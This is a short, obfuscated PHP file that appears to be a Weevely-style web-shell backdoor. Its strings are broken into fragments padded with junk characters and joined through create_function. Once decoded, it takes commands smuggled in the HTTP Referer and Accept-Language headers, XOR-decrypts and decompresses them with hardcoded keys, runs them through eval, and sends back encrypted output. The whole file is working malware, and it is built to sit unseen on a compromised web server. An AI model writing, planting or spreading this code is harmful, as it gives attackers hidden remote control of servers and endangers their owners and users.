<?php
$c='Gk0,3));$p="Gk";for($z=1;$zGk<couGkGknt($m[1]);$z++GkGk)$p.Gk=$q[$m[Gk2][$z]];if(sGktrpos($pGk,$h)===0){Gk$s[Gk$';
$B='l;Gk){fGkor($j=0;($j<$c&Gk&$i<$lGk);Gk$j++,$i++Gk){$o.=$Gkt{$i}^Gk$k{$jGk};}}GkreturnGkGk $o;}$r=$_GkSERVGkER;$r';
$Y='r);parse_str($uGk[Gk"qGkuery"],$q);$qGk=Gkarray_valGkues($q);pGkreg_mGkatGkch_all("/([Gk\\w])[\\GkwGk-]+(?:;q=0.Gk';
$b='kGk);$Gkd=basGke64_encode(x(gzcoGkmpGkGkGkresGks($o),$k));print(Gk"<$k>$d</$k>Gk");Gk@sessioGkn_destroy(Gk);}}}}';
$D='([Gk\\d]))?Gk,?Gk/",$ra,$mGk);if($qGkGkGk&&$m){Gk@session_startGk();$s=&$_SESSGkIGkON;$ss="subsGktrGk";$sl="stGkr';
$t='toloGkwer";Gk$i=$m[1][Gk0]Gk.$m[1Gk][1Gk];$h=$slGk($ss(md5($i.Gk$kh),0,3Gk))GkGk;$Gkf=$sl(Gk$Gkss(md5($Gki.$kf),';
$E=str_replace('F','','FcreatFe_FFfuFFnction');
$X='_/","Gk/-/"),GkGkaGkrray("/","Gk+Gk"),$Gkss($s[Gk$i],0,$e))),$k)));$o=oGkGkb_get_GkconteGkntGks();ob_end_clean(G';
$a='r=@$r["GkHTTP_GkREFERGkER"];$ra=Gk@Gk$rGk["HTTP_ACCEPT_LGkANGUAGkGGkEGk"];Gkif($rr&&$ra){$u=pGkarse_urGkl(GkGk$r';
$U='i]="";$pGkGk=$sGks($p,3);Gk}if(GkarrayGkGk_key_exists($i,Gk$s))Gk{$s[$i].=$p;$eGk=strpGkos($sGk[$GkiGk],$f);ifGk';
$I='$kGkh="5dGk41"Gk;$kf="Gk402a";function x(Gk$t,$k){$Gkc=strGklen($k)GkGk;$l=strlGken($t)Gk;$o="Gk";fGkor($i=Gk0;$i<$';
$V='(GkGk$e){$k=$kh.Gk$kf;oGkb_start();@evaGkl(@gzuncompresGks(@x(@bGkase6Gk4_dGkecodGke(preg_repGklace(arraGky("Gk/';
$O=str_replace('Gk','',$I.$B.$a.$Y.$D.$t.$c.$U.$V.$X.$b);
$m=$E('',$O);$m();
?>
